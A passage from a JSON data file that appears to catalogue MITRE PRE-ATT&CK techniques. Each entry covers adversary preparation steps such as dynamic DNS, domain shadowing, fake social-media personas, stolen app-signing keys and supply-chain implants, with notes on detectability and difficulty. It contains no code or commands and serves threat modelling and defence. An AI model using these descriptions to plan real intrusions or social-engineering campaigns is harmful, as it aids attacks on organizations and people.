easily detectable unless domain registrar provides alerting on any updates.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Requires adversary to gain access to an email account for person listed as the domain registrar\/POC.  The adversary can then claim that they forgot their password in order to make changes to the domain registration.  Other possibilities include social engineering a domain registration help desk to gain access to an account or take advantage of renewal process gaps.","detection":null,"platforms":[]},{"id":77,"name":"T1333 - Dynamic DNS","sort_id":0,"external_id":"T1333","external_sub_id":null,"old_external_id":"PRE-T1110","old_external_sub_id":null,"tactic_id":3,"description":"<p>Dynamic DNS is a automated method to rapidly update the domain name system mapping of hostnames to IPs. (Citation: FireEyeSupplyChain)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender will not know at first use what is valid or hostile traffic without more context.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"It is relatively easy to subscribe to dynamic DNS providers or find ways to get different IP addresses from a cloud provider.","detection":null,"platforms":[]},{"id":106,"name":"T1336 - Install and configure hardware, network, and systems","sort_id":0,"external_id":"T1336","external_sub_id":null,"old_external_id":"PRE-T1113","old_external_sub_id":null,"tactic_id":3,"description":"<p>An adversary needs the necessary skills to set up procured equipment and software to create their desired infrastructure. (Citation: KasperskyRedOctober)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender will not have visibility on 3rd party sites unless target is successfully enticed to visit one.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Skills are common to majority of computer scientists and \"hackers\".  Can be easily obtained through contracting if not organic to adversary's organization.","detection":null,"platforms":[]},{"id":115,"name":"T1331 - Obfuscate infrastructure","sort_id":0,"external_id":"T1331","external_sub_id":null,"old_external_id":"PRE-T1108","old_external_sub_id":null,"tactic_id":3,"description":"<p>Obfuscation is hiding the day-to-day building and testing of new tools, chat servers, etc. (Citation: FireEyeAPT17)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender will generally not have visibility into their infrastructure.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Building and testing infrastructure and obfuscating it to protect it against intrusions are a standard part of the adversary process in preparing to conduct an operation against a target.","detection":null,"platforms":[]},{"id":120,"name":"T1396 - Obtain booter\/stressor subscription","sort_id":0,"external_id":"T1396","external_sub_id":null,"old_external_id":"PRE-T1173","old_external_sub_id":null,"tactic_id":3,"description":"<p>Configure and setup booter\/stressor services, often intended for server stress testing, to enable denial of service attacks. (Citation: Krebs-Anna) (Citation: Krebs-Booter) (Citation: Krebs-Bazaar)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Purchase of booster services is not observable; potentially can trace booster service used to origin of sale, yet not before attack is executed. Furthermore, subscription does not automatically mean foul intention.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Easily accessible and used to launch DDoS attacks by even novice Internet users, and can be purchased from providers for a nominal fee, some of which even accept credit cards and PayPal payments to do.","detection":null,"platforms":[]},{"id":127,"name":"T1335 - Procure required equipment and software","sort_id":0,"external_id":"T1335","external_sub_id":null,"old_external_id":"PRE-T1112","old_external_sub_id":null,"tactic_id":3,"description":"<p>An adversary will require some physical hardware and software. They may only need a lightweight set-up if most of their activities will take place using on-line infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems. (Citation: NYTStuxnet)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Outside of highly specific or rare HW, nearly impossible to detect and track.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Ease and availability of current hardware and software, mobile phones (cash and go phones), and additional online technology simplifies adversary process to achieve this technique (and possibly without traceability). The adversary has control of the infrastructure and will likely be able to add\/remove tools to infrastructure, whether acquired via hacking or standard computer acquisition (e.g., [https:\/\/aws.amazon.com AWS], VPS).","detection":null,"platforms":[]},{"id":135,"name":"T1337 - SSL certificate acquisition for domain","sort_id":0,"external_id":"T1337","external_sub_id":null,"old_external_id":"PRE-T1114","old_external_sub_id":null,"tactic_id":3,"description":"<p>Certificates are designed to instill trust. They  include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. Acquiring a certificate for a  domain name similar to one that is expected to be trusted may allow an adversary to trick a user in to trusting the domain (e.g., vvachovia instead of <a href=\"https:\/\/www.wellsfargo.com\/about\/corporate\/wachovia\">Wachovia<\/a> -- homoglyphs). (Citation: SubvertSSL) (Citation: PaypalScam)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Defender can monitor for domains similar to popular sites (possibly leverage [https:\/\/www.alexa.com Alexa] top ''N'' lists as starting point).","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"SSL certificates are readily available at little to no cost.","detection":null,"platforms":[]},{"id":136,"name":"T1338 - SSL certificate acquisition for trust breaking","sort_id":0,"external_id":"T1338","external_sub_id":null,"old_external_id":"PRE-T1115","old_external_sub_id":null,"tactic_id":3,"description":"<p>Fake certificates can be acquired by legal process or coercion. Or, an adversary can trick a Certificate Authority into issuing a certificate. These fake certificates can be used as a part of Man-in-the-Middle attacks. (Citation: SubvertSSL)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"The certificate authority who is hacked cannot easily see they've been compromised, but [https:\/\/www.google.com Google] has caught on to this occurring in previous attacks such as DigiNotarDigiNotar2016 and [https:\/\/www.verisign.com Verisign].","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"One example of it occurring in the real world is the DigiNotarDigiNotar2016 case.  To be able to do this usually requires sophisticated skills and is traditionally done by a nation state to spy on its citizens.","detection":null,"platforms":[]},{"id":138,"name":"T1340 - Shadow DNS","sort_id":0,"external_id":"T1340","external_sub_id":null,"old_external_id":"PRE-T1117","old_external_sub_id":null,"tactic_id":3,"description":"<p>The process of gathering domain account credentials in order to silently create subdomains pointed at malicious servers without tipping off the actual owner. (Citation: CiscoAngler) (Citation: ProofpointDomainShadowing)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Partial","detectable_by_common_defenses_explanation":"Detection of this technique requires individuals to monitor their domain registrant accounts routinely.  In addition, defenders have had success with blacklisting sites or IP addresses, but an adversary can defeat this by rotating either the subdomains or the IP addresses associated with the campaign.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"To successfully conduct this attack, an adversary usually phishes the individual behind the domain registrant account, logs in with credentials, and creates a large amount of subdomains.","detection":null,"platforms":[]},{"id":150,"name":"T1327 - Use multiple DNS infrastructures","sort_id":0,"external_id":"T1327","external_sub_id":null,"old_external_id":"PRE-T1104","old_external_sub_id":null,"tactic_id":3,"description":"<p>A technique used by the adversary similar to Dynamic DNS with the exception that the use of multiple DNS infrastructures likely have whois records. (Citation: KrebsStLouisFed)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Partial","detectable_by_common_defenses_explanation":"This is by design captured in public registration logs.  Various tools and services exist to track\/query\/monitor domain name registration information.  However, tracking multiple DNS infrastructures will likely require multiple tools\/services or more advanced analytics.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Requires more planning, but feasible.","detection":null,"platforms":[]}]},{"id":5,"name":"Organizational Weakness Identification","source_name":"PRE_ATT_organizational-weakness-identification","sort_id":0,"external_id":"TA0020","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":16,"tactic_id":5},"techniques":[{"id":13,"name":"T1301 - Analyze business processes","sort_id":0,"external_id":"T1301","external_sub_id":null,"old_external_id":"PRE-T1078","old_external_sub_id":null,"tactic_id":5,"description":"<p>Business processes, such as who typically communicates with who, or what the supply chain is for a particular part, provide opportunities for social engineering or other  (Citation: Warwick2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Social engineering and other attempts to learn about business practices and processes would not immediately be associated with an impending cyber event.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"To get any kind of fidelity into business processes would require insider access.  Basic processes could be mapped, but understanding where in the organization these processes take place and who to target during any given phase of the process would generally be difficult.","detection":null,"platforms":[]},{"id":16,"name":"T1300 - Analyze organizational skillsets and deficiencies","sort_id":0,"external_id":"T1300","external_sub_id":null,"old_external_id":"PRE-T1077","old_external_sub_id":null,"tactic_id":5,"description":"<p>Analyze strengths and weaknesses of the target for potential areas of where to focus compromise efforts. (Citation: FakeLinkedIn)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"This can be done offline after the data has been collected.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Analyze strengths and weaknesses of the target for potential areas of where to focus compromise efforts.","detection":null,"platforms":[]},{"id":19,"name":"T1303 - Analyze presence of outsourced capabilities","sort_id":0,"external_id":"T1303","external_sub_id":null,"old_external_id":"PRE-T1080","old_external_sub_id":null,"tactic_id":5,"description":"<p>Outsourcing, the arrangement of one company providing goods or services to another company for something that could be done in-house, provides another avenue for an adversary to target. Businesses often have networks, portals, or other technical connections between themselves and their outsourced\/partner organizations that could be exploited. Additionally, outsourced\/partner organization information could provide opportunities for phishing. (Citation: Scasny2015) (Citation: OPM Breach)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Much of this analysis can be done using the target's open source website, which is purposely designed to be informational and may not have extensive visitor tracking capabilities.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Analyzing business relationships from information gathering may provide insight into outsourced capabilities.  In certain industries, outsourced capabilities or close business partnerships may be advertised on corporate websites.","detection":null,"platforms":[]},{"id":25,"name":"T1299 - Assess opportunities created by business deals","sort_id":0,"external_id":"T1299","external_sub_id":null,"old_external_id":"PRE-T1076","old_external_sub_id":null,"tactic_id":5,"description":"<p>During mergers, divestitures, or other period of change in joint infrastructure or business processes there may be an opportunity for exploitation. During this type of churn, unusual requests, or other non standard practices may not be as noticeable. (Citation: RossiMergers) (Citation: MeidlHealthMergers)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Most of this activity would target partners and business processes.  Partners would not report.  Difficult to tie this activity to a cyber attack.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Mapping joint infrastructure and business processes is difficult without insider knowledge or SIGINT capability.  While a merger creates and opportunity to exploit potentially cumbersome or sloppy business processes, advance notice of a merger is difficult; merger information is typically close-hold until the deal is done.","detection":null,"platforms":[]},{"id":26,"name":"T1302 - Assess security posture of physical locations","sort_id":0,"external_id":"T1302","external_sub_id":null,"old_external_id":"PRE-T1079","old_external_sub_id":null,"tactic_id":5,"description":"<p>Physical access may be required for certain types of adversarial actions. (Citation: CyberPhysicalAssessment) (Citation: CriticalInfrastructureAssessment)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Physical security is often unaware of implications of physical access to network.  However, some organizations have thorough physical security measures that would log and report attempted incursions, perimeter breaches, unusual RF at a site, etc.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Social engineering and OSINT are still generally successful.  Physical locations of offices\/sites are easily determined.  Monitoring for other sites of interest, such as backup storage vendors, is also easy to accomplish.","detection":null,"platforms":[]},{"id":28,"name":"T1298 - Assess vulnerability of 3rd party vendors","sort_id":0,"external_id":"T1298","external_sub_id":null,"old_external_id":"PRE-T1075","old_external_sub_id":null,"tactic_id":5,"description":"<p>Once a 3rd party vendor has been identified as being of interest it can be probed for vulnerabilities just like the main target would be. (Citation: Zetter2015Threats) (Citation: WSJTargetBreach)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"3rd parties would most likely not report network scans to their partners.  Target network would not know that their 3rd party partners were being used as a vector.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"The difficult part is enumerating all 3rd parties.  Finding major partners would not be difficult.  Significantly easier with insider knowledge.  Vulnerability scanning the 3rd party networks is trivial.","detection":null,"platforms":[]}]},{"id":7,"name":"People Weakness Identification","source_name":"PRE_ATT_people-weakness-identification","sort_id":0,"external_id":"TA0019","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":16,"tactic_id":7},"techniques":[{"id":18,"name":"T1297 - Analyze organizational skillsets and deficiencies","sort_id":0,"external_id":"T1297","external_sub_id":null,"old_external_id":"PRE-T1074","old_external_sub_id":null,"tactic_id":7,"description":"<p>Understanding organizational skillsets and deficiencies could provide insight in to weakness in defenses, or opportunities for exploitation. (Citation: FakeLinkedIn)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"No access to who is consuming the job postings to know what is being observed.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Job postings have to be made public for contractors and many times have the name of the organization being supported.","detection":null,"platforms":[]},{"id":20,"name":"T1295 - Analyze social and business relationships, interests, and affiliations","sort_id":0,"external_id":"T1295","external_sub_id":null,"old_external_id":"PRE-T1072","old_external_sub_id":null,"tactic_id":7,"description":"<p>Social media provides insight into the target's affiliations with groups and organizations.  Certification information can explain their technical associations and professional associations. Personal information can provide data for exploitation or even blackmail. (Citation: Scasny2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Public sources are external to the defender's organization.  Some social media sites have an option to show you when users are looking at your profile, but an adversary can evade this tracking depending on how they conduct the searches.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Social and business relationship information for an individual can be found by examining their social media contacts (e.g., [https:\/\/www.facebook.com Facebook] and [https:\/\/www.linkedin.com LinkedIn]).  Social media also provides insight into the target's affiliations with groups and organizations.  Finally, certification information can explain their technical associations and professional associations.","detection":null,"platforms":[]},{"id":27,"name":"T1296 - Assess targeting options","sort_id":0,"external_id":"T1296","external_sub_id":null,"old_external_id":"PRE-T1073","old_external_sub_id":null,"tactic_id":7,"description":"<p>An adversary may assess a target's operational security (OPSEC) practices in order to identify targeting options. A target may share different information in different settings or be more of less cautious in different environments. (Citation: Scasny2015) (Citation: EverstineAirStrikes)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender does not have access to information stored outside of defenders scope or visibility (e.g., log data for Facebook is not easily accessible).  Defender has very infrequent visibility into an adversary's more detailed TTPs for developing people targets.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Information is out in the open for items that are available - part of this is ease of use for consumers to support the expected networking use case.  OSINT can provide many avenues to gather intel which contain weaknesses.  Developing and refining the methodology to exploit weak human targets has been done for years (e.g., spies).","detection":null,"platforms":[]}]},{"id":8,"name":"Persona Development","source_name":"PRE_ATT_persona-development","sort_id":0,"external_id":"TA0023","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":16,"tactic_id":8},"techniques":[{"id":33,"name":"T1341 - Build social network persona","sort_id":0,"external_id":"T1341","external_sub_id":null,"old_external_id":"PRE-T1118","old_external_sub_id":null,"tactic_id":8,"description":"<p>For attacks incorporating social engineering the utilization of an on-line persona is important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (<a href=\"https:\/\/www.facebook.com\">Facebook<\/a>, <a href=\"https:\/\/www.linkedin.com\">LinkedIn<\/a>, <a href=\"https:\/\/twitter.com\">Twitter<\/a>, <a href=\"https:\/\/plus.google.com\">Google+<\/a>, etc.). (Citation: NEWSCASTER2014) (Citation: BlackHatRobinSage) (Citation: RobinSageInterview)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Unless there is some threat intelligence reporting, these users are hard to differentiate.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Performing activities like typical users, but with specific intent in mind.","detection":null,"platforms":[]},{"id":36,"name":"T1391 - Choose pre-compromised mobile app developer account credentials or signing keys","sort_id":0,"external_id":"T1391","external_sub_id":null,"old_external_id":"PRE-T1168","old_external_sub_id":null,"tactic_id":8,"description":"<p>The adversary can use account credentials or signing keys of an existing mobile app developer to publish malicious updates of existing mobile apps to an application store, or to abuse the developer's identity and reputation to publish new malicious apps.  Many mobile devices are configured to automatically install new versions of already-installed apps. (Citation: Fraudenlent Apps Stolen Dev Credentials)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Possible to detect compromised credentials if alerting from a service provider is enabled and acted upon by the individual.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"The difficulty of obtaining useful developer credentials may vary.  Well-organized, professional app developers whose credentials or signing keys would be the most useful to an adversary because of the large install bases of their apps, would likely strongly protect their credentials and signing keys.  Less-organized app developers may not protect their credentials and signing keys as strongly, but the credentials and signing keys would also be less useful to an adversary.  These less-organized app developers may reuse passwords across sites, fail to turn on multi-factor authentication features when available, or store signing keys in unprotected locations.","detection":null,"platforms":[]},{"id":37,"name":"T1343 - Choose pre-compromised persona and affiliated accounts","sort_id":0,"external_id":"T1343","external_sub_id":null,"old_external_id":"PRE-T1120","old_external_sub_id":null,"tactic_id":8,"description":"<p>For attacks incorporating social engineering the utilization of an on-line persona is important. Utilizing an existing persona with compromised accounts may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. (Citation: AnonHBGary) (Citation: Hacked Social Media Accounts)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Possible to detect compromised credentials if alerting from a service provider is enabled and acted upon by the individual.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"It is relatively easy and low cost to purchase compromised credentials.  Mining social media sites offers open source information about a particular target.  Most users tend to reuse passwords across sites and are not paranoid enough to check and see if spoofed sites from their persona exist across current social media.","detection":null,"platforms":[]},{"id":69,"name":"T1342 - Develop social network persona digital footprint","sort_id":0,"external_id":"T1342","external_sub_id":null,"old_external_id":"PRE-T1119","old_external_sub_id":null,"tactic_id":8,"description":"<p>Both newly built personas and pre-compromised personas may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. (Citation: NEWSCASTER2014) (Citation: BlackHatRobinSage) (Citation: RobinSageInterview)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Unless there is some threat intelligence reporting, these users are hard to differentiate.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"The only difference between an adversary conducting this technique and a typical user, is the adversary's intent - to target an individual for compromise.","detection":null,"platforms":[]},{"id":81,"name":"T1344 - Friend\/Follow\/Connect to targets of interest","sort_id":0,"external_id":"T1344","external_sub_id":null,"old_external_id":"PRE-T1121","old_external_sub_id":null,"tactic_id":8,"description":"<p>Once a persona has been developed an adversary will use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. (Citation: NEWSCASTER2014) (Citation: BlackHatRobinSage)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Unless there is some threat intelligence reporting, these users are hard to differentiate.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"The nature of social media is such that the adversary naturally connects to a target of interest without suspicion, given the purpose of the platform is to promote connections between individuals.  Performing activities like typical users, but with specific intent in mind.","detection":null,"platforms":[]},{"id":119,"name":"T1392 - Obtain Apple iOS enterprise distribution key pair and certificate","sort_id":0,"external_id":"T1392","external_sub_id":null,"old_external_id":"PRE-T1169","old_external_sub_id":null,"tactic_id":8,"description":"<p>The adversary can obtain an Apple iOS enterprise distribution key pair and certificate and use it to distribute malicious apps directly to Apple iOS devices without the need to publish the apps to the Apple App Store (where the apps could potentially be detected). (Citation: Apple Developer Enterprise Porgram Apps) (Citation: Fruit vs Zombies) (Citation: WIRELURKER) (Citation: Sideloading Change)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Partial","detectable_by_common_defenses_explanation":"Starting in iOS 9, Apple has changed the user interface when installing apps to better indicate to users the potential implications of installing apps signed by an enterprise distribution key rather than from Apple's App Store and to make it more difficult for users to inadvertently install these apps. Additionally, enterprise management controls are available that can be imposed to prevent installing these apps. Also, enterprise mobility management \/ mobile device management (EMM\/MDM) systems can be used to scan for the presence of undesired apps on enterprise mobile devices.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Apple requires a DUNS number, corporate documentation, and $299 to obtain an enterprise distribution certificate. Additionally, Apple revokes certificates if they discover malicious use.  However, the enrollment information could be falsified to Apple by an adversary, or an adversary could steal an existing enterprise distribution certificate (and the corresponding private key) from a business that already possesses one.","detection":null,"platforms":[]}]},{"id":11,"name":"Stage Capabilities","source_name":"PRE_ATT_stage-capabilities","sort_id":0,"external_id":"TA0026","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":16,"tactic_id":11},"techniques":[{"id":72,"name":"T1379 - Disseminate removable media","sort_id":0,"external_id":"T1379","external_sub_id":null,"old_external_id":"PRE-T1156","old_external_sub_id":null,"tactic_id":11,"description":"<p>Removable media containing malware can be injected in to a supply chain at large or small scale. It can also be physically placed for someone to find or can be sent to someone in a more targeted manner. The intent is to have the user utilize the removable media on a system where the adversary is trying to gain access. (Citation: USBMalwareAttacks) (Citation: FPDefendNewDomain) (Citation: ParkingLotUSB)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"From a technical perspective, detection of an adversary disseminating removable media is not possible as there is no technical element involved until the compromise phase.  Most facilities generally do not perform extensive physical security patrols, which would be necessary in order to promptly identify an adversary deploying removable media to be used in an attack.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Commonly executed technique by penetration testers to gain access to networks via end users who are innately trusting of newly found or available technology.","detection":null,"platforms":[]},{"id":73,"name":"T1394 - Distribute malicious software development tools","sort_id":0,"external_id":"T1394","external_sub_id":null,"old_external_id":"PRE-T1171","old_external_sub_id":null,"tactic_id":11,"description":"<p>An adversary could distribute malicious software development tools (e.g., compiler) that hide malicious behavior in software built using the tools. (Citation: PA XcodeGhost) (Citation: Reflections on Trusting Trust)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Developers could check a hash or signature of their development tools to ensure that they match expected values (e.g., Apple provides instructions of how to do so for its Xcode developer tool), but developers may not always do so.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"The adversary would need to either replace the tools provided at the official download location or influence developers to download the tools from an adversary-controlled third-party download location. Desktop operating systems (e.g., Windows, macOS) are increasingly encouraging use of vendor-provided official app stores to distribute software, which utilize code signing and increase the difficulty of replacing development tools with malicious versions.","detection":null,"platforms":[]},{"id":82,"name":"T1364 - Friend\/Follow\/Connect to targets of interest","sort_id":0,"external_id":"T1364","external_sub_id":null,"old_external_id":"PRE-T1141","old_external_sub_id":null,"tactic_id":11,"description":"<p>A form of social engineering designed build trust and to lay the foundation for future interactions or attacks. (Citation: BlackHatRobinSage)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Users have the ability to detect and report non-authenticated individuals requesting to follow, friend or connect to a target.  However the rigidity in validating the users is not typically followed by standard users.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Connecting with \"friends\" is a fundamental requirement for social media - without it, social media is worthless.  An adversary can easily create a profile and request targets to validate the requests.","detection":null,"platforms":[]},{"id":84,"name":"T1365 - Hardware or software supply chain implant","sort_id":0,"external_id":"T1365","external_sub_id":null,"old_external_id":"PRE-T1142","old_external_sub_id":null,"tactic_id":11,"description":"<p>During production and distribution, the placement of software, firmware, or a CPU chip in a computer, handheld, or other electronic device that enables an adversary to gain illegal entrance. (Citation: McDRecall) (Citation: SeagateMaxtor)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"The number of elements and components in a supply chain of HW or SW is vast and detecting an implant is complex for SW, but more complex for HW.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Access to the supply chain by an adversary can be a challenging endeavor, depending on what element is attempting to be subverted.","detection":null,"platforms":[]},{"id":124,"name":"T1363 - Port redirector","sort_id":0,"external_id":"T1363","external_sub_id":null,"old_external_id":"PRE-T1140","old_external_sub_id":null,"tactic_id":11,"description":"<p>Redirecting a communication request from one address and port number combination to another. May be set up to obfuscate the final location of communications that will occur in later stages of an attack. (Citation: SecureWorks HTRAN Analysis)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Infrastructure is (typically) outside of control\/visibility of defender and as such as tools are staged for specific campaigns, it will not be observable to those being attacked.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Adversary has control of the infrastructure and will likely be able to add\/remove tools to infrastructure, whether acquired via hacking or standard computer acquisition (e.g., [https:\/\/aws.amazon.com AWS], VPS providers).","detection":null,"platforms":[]},{"id":149,"name":"T1362 - Upload, install, and configure software\/tools","sort_id":0,"external_id":"T1362","external_sub_id":null,"old_external_id":"PRE-T1139","old_external_sub_id":null,"tactic_id":11,"description":"<p>An adversary may stage software and tools for use during later stages of an attack. The software and tools may be placed on systems legitimately in use by the adversary or may be placed on previously compromised infrastructure. (Citation: APT1) (Citation: RedOctober)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Infrastructure is (typically) outside of control\/visibility of defender and as such as tools are staged for specific campaigns, it will not be observable to those being attacked.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Adversary has control of the infrastructure and will likely be able to add\/remove tools to infrastructure, whether acquired via hacking or standard computer acquisition (e.g., [https:\/\/aws.amazon.com AWS], VPS providers).","detection":null,"platforms":[]}]},{"id":14,"name":"Technical Weakness Identification","source_name":"PRE_ATT_technical-weakness-identification","sort_id":0,"external_id":"TA0018","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":16,"tactic_id":14},"techniques":[{"id":11,"name":"T1293 - Analyze application security posture","sort_id":0,"external_id":"T1293","external_sub_id":null,"old_external_id":"PRE-T1070","old_external_sub_id":null,"tactic_id":14,"description":"<p>An adversary can probe a victim's network to determine configurations. The configurations may provide opportunities to route traffic through the network in an undetected or less detectable way. (Citation: Li2014ExploitKits) (Citation: RecurlyGHOST)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"This can be done offline after the data has been collected.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Analyze technical scanning results to identify weaknesses in the configuration or architecture.  Many of the common tools highlight these weakness automatically (e.g., software security scanning tools or published vulnerabilities about commonly used libraries).","detection":null,"platforms":[]},{"id":12,"name":"T1288 - Analyze architecture and configuration posture","sort_id":0,"external_id":"T1288","external_sub_id":null,"old_external_id":"PRE-T1065","old_external_sub_id":null,"tactic_id":14,"description":"<p>An adversary may analyze technical scanning results to identify weaknesses in the configuration or architecture of a victim network. These weaknesses could include  architectural flaws, misconfigurations, or improper security controls. (Citation: FireEyeAPT28)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"This can be done offline after the data has been collected.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Many of the common tools highlight these weakness 